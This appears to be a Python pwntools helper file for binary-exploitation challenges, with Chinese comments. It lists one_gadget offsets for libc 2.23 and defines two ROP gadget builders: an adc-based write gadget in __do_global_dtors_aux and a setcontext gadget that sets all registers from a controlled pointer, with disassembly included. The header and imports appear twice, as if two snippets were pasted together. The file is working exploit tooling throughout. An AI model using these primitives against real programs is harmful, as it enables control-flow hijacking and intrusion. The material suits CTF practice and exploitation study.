# -*- coding:utf-8 -*-
from pwn import *
# libc 2.23
one=[0x45216, 0x4526a, 0xf02a4, 0xf1147, 0xcd0f3, 0xcd1c8, 0xf02b0, 0xf66f0]

# -*- coding:utf-8 -*-
from pwn import *

def gedget1(addr,retaddr):
    # 这个gadget需要控制rbp和栈, 就可以实现花式栈溢出, 用加减法来写libc地址, 可结合csu食用
    # 位于_do_global_dtors_aux+8的位置
    # adc dword ptr [rbp+0x48],edx
    return p64(addr)+p64(0xdeadbeef)+p64(retaddr)

def gadget2(addr):
    # 这个gadget控制所有的寄存器, 但是需要首先控制一个寄存器
    # 测试环境为 rdi, 其他的自行fix
    # 位于libc中,大概 0x47b75 的位置(2.23), setcontext函数末尾(setcontext+0x35?)
# .text:0000000000047B75                 mov     rsp, [rdi+0A0h]
# .text:0000000000047B7C                 mov     rbx, [rdi+80h]
# .text:0000000000047B83                 mov     rbp, [rdi+78h]
# .text:0000000000047B87                 mov     r12, [rdi+48h]
# .text:0000000000047B8B                 mov     r13, [rdi+50h]
# .text:0000000000047B8F                 mov     r14, [rdi+58h]
# .text:0000000000047B93                 mov     r15, [rdi+60h]
# .text:0000000000047B97                 mov     rcx, [rdi+0A8h]   
# .text:0000000000047B9E                 push    rcx
# .text:0000000000047B9F                 mov     rsi, [rdi+70h]
# .text:0000000000047BA3                 mov     rdx, [rdi+88h]
# .text:0000000000047BAA                 mov     rcx, [rdi+98h]
# .text:0000000000047BB1                 mov     r8, [rdi+28h]
# .text:0000000000047BB5                 mov     r9, [rdi+30h]
# .text:0000000000047BB9                 mov     rdi, [rdi+68h]
# .text:0000000000047BBD                 xor     eax, eax
# .text:0000000000047BBF                 retn
    # rcx为返回地址, rdi为可控指针
    return p64(addr+0x47b75)
    